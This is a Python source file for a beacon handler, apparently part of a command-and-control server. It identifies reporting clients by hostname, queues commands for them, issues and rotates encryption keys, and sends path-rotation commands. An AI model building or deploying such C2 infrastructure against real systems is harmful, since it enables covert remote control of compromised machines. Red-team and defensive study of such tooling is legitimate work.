import logging
import json

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        # Extract system info from headers
        system_info_raw = self.headers.get('X-System-Info')
        
        # Identify the client - now returns first_contact flag
        client_id, system_info, newly_identified, first_contact = self.client_helper.identify_client(
            self.client_address[0], 
            self.headers,
            system_info_raw
        )
        
        # Log the beacon
        self.log_message(f"Identified client {client_id} ({system_info.get('Hostname', 'Unknown')}){' - FIRST CONTACT' if first_contact else ''}")
        
        # Verify client if system info is available and not first contact
        needs_key_rotation = False
        if system_info and not first_contact:
            _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
        
        # Organize commands for the client
        commands, has_key_operation = self.client_helper.organize_commands(
            client_id, 
            include_key_rotation=needs_key_rotation,
            first_contact=first_contact
        )
        
        # Add path rotation command if needed for established clients
        if include_rotation_info and not first_contact:
            path_rotation_command = self.path_router.create_path_rotation_command()
            commands.append(path_rotation_command)
            self.log_message(f"Sending path rotation info to client {client_id}")
        
        # Log commands being sent
        for command in commands:
            cmd_type = command['command_type']
            args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
            self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
        
        # Send response to client
        self._send_beacon_response(client_id, commands, has_key_operation, first_contact)
        
        # Clear key rotation commands after delivery
        if has_key_operation and not first_contact:
            self.client_helper.clear_commands_after_rotation(client_id)
    
    def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact):
        """Send the encrypted response to the client beacon"""
        # For first contact, send unencrypted response with key
        if first_contact:
            # Set additional headers
            headers = {
                "X-First-Contact": "true",
                "X-Key-Issuance": "true"
            }
            
            # Convert commands to JSON - ensure this is properly formatted JSON!
            commands_json = json.dumps(commands)
            
            # Send response without encryption for initial key exchange
            self.send_response(200, "application/json", commands_json, headers)
            self.log_message(f"Sent unencrypted key issuance to new client {client_id}")
            return
        
        # Convert commands to JSON
        commands_json = json.dumps(commands)
        
        # For established clients, encrypt the response
        encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
        
        # Set additional headers
        headers = {}
        if has_key_operation:
            headers["X-Key-Rotation"] = "true"
        
        # Send encrypted response
        self.send_response(200, "application/json", encrypted_commands, headers)